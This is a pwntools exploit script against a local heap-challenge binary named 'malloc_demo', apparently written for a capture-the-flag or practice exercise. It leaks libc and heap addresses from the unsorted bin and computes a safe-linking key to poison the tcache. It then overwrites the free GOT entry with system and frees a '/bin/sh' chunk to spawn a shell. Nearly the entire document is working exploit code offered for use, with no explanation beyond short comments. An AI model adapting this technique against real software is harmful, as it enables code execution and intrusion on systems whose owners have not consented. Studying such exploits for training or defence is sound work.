from pwn import *

exe = ELF('./malloc_demo')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.binary = exe

io = exe.process()
index = 0

if args.GDB:
	gdb.attach(io,"""
	gdb commands here
	""")

def malloc(s):
    global index
    io.sendlineafter('>> ', '1')
    io.sendlineafter('>> ', str(s))
    ret = index
    index += 1
    return ret


def read(i):
    io.sendlineafter('>> ', '2')
    io.sendlineafter('>> ', str(i))
    return io.readuntil("\n")[1:-1]

def edit(i, data):
    io.sendlineafter('>> ', '3')
    io.sendlineafter('>> ', str(i))
    io.sendafter('>> ', data)

def free(i):
    global index
    io.sendlineafter('>> ', '4')
    io.sendlineafter('>> ', str(i))

def main():

    # Unsortedbin libc leak + restore heap
    # unsorted_1 + consolidation guard + unsorted_2 + consolidation guard
    leak = malloc(0x418)
    guard = malloc(0x418)
    heap_link = malloc(0x418)
    top_guard = malloc(0x418)
    free(heap_link)
    free(leak)

    leak = read(leak)
    heap = u64(leak[:8])-0xac0
    libc.address = u64(leak[8:16])-0x21ace0
    log.success("libc @ "+hex(libc.address))
    log.success("heap @ "+hex(heap))

    free(guard)
    free(top_guard)

    # Fake chunk overlapping tcache
    chunk_A = malloc(0x408)
    poison = malloc(0x408)
    free(chunk_A)
    free(poison)
    # Pass safe link /w heap leak, point to start of tcache
    addr = heap+1696
    key = (addr >> 12) ^ heap
    log.success("key is "+hex(key))
    edit(poison,p64(key))

    # Change tcache head to point to free GOT
    malloc(0x408)
    overlap = malloc(0x408)
    # Corrupt entries[0x410]->free.got-8 (pass tcache alignment check) and count[0x410]->1
    edit(overlap,p16(0)*63+p64(0x1)+p64(0)*62+p16(0)+p64(0x404010))

    # Overwrite free got /w system
    free_got = malloc(0x408)
    edit(free_got,b"/bin/sh\x00"+p64(libc.sym.system))
    free(free_got)

    io.interactive()


if __name__ == '__main__':
    main()
